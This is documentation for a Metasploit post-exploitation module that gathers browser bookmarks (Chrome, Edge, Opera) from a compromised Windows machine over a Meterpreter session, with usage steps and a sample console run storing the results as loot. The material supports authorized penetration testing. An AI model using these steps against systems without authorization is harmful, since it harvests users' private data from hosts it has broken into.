## Vulnerable Application

This modules retrieves stored bookmarks for Google Chrome, Microsoft Edge and Opera if the browsers exist on the target machine.

## Verification Steps
  1. Start msfconsole
  2. Get meterpreter session
  3. Do: ```use post/windows/gather/get_bookmarks```
  4. Do: ```set SESSION <session id>```
  5. Do: ```run```

## Options


  **SESSION**

  The session to run this module on.

## Scenarios

### Windows 11.

  ```
msf6 exploit(multi/handler) > use post/windows/gather/get_bookmarks
[*] Using configured payload windows/x64/meterpreter/reverse_tcp

msf6 post(windows/gather/get_bookmarks) > set session 3
session => 3
msf6 post(windows/gather/get_bookmarks) > run


[-] Error loading USER S-1-5-21-1515542607-384395710-682424177-500: Profile doesn't exist or cannot be accessed
[*] BOOKMARKS FOR <user>
[*] Bookmarks stored: C:/metasploit/apps/pro/loot/20220405164635_default_GoogleChrome.boo_219405.txt
[-] Error loading USER S-1-5-21-1515542607-384395710-682424177-500: Profile doesn't exist or cannot be accessed
[*] BOOKMARKS FOR <user>
[*] Bookmarks stored: C:/metasploit/apps/pro/loot/20220405164637_default_Opera.bookmarks_833249.txt
[-] Error loading USER S-1-5-21-1515542607-384395710-682424177-500: Profile doesn't exist or cannot be accessed
[*] BOOKMARKS FOR <user>
[*] Bookmarks stored: C:/metasploit/apps/pro/loot/20220405164640_default_Edge.bookmarks_245676.txt
[*] Post module execution completed

msf6 post(windows/gather/get_bookmarks) > loot

Loot
====

host             service  type                    name                                                                                 content     info                        path
----             -------  ----                    ----                                                                                 -------     ----                        ----
<ip>                       Opera.bookmarks         #<Msf::Sessions::Meterpreter_x64_Win:0x000001dd509f2f48>_Opera_bookmarks.txt         text/plain  Bookmarks for Opera         C:/metasploit/apps/pro/loot/20220405164430_default_Opera.bookmarks_344376.txt
<ip>                       Edge.bookmarks          #<Msf::Sessions::Meterpreter_x64_Win:0x000001dd509f2f48>_Edge_bookmarks.txt          text/plain  Bookmarks for Edge          C:/metasploit/apps/pro/loot/20220405164432_default_Edge.bookmarks_798475.txt
<ip>                       GoogleChrome.bookmarks  #<Msf::Sessions::Meterpreter_x64_Win:0x000001dd509f2f48>_GoogleChrome_bookmarks.txt  text/plain  Bookmarks for GoogleChrome  C:/metasploit/apps/pro/loot/20220405164427_default_GoogleChrome.boo_256524.txt

  ```
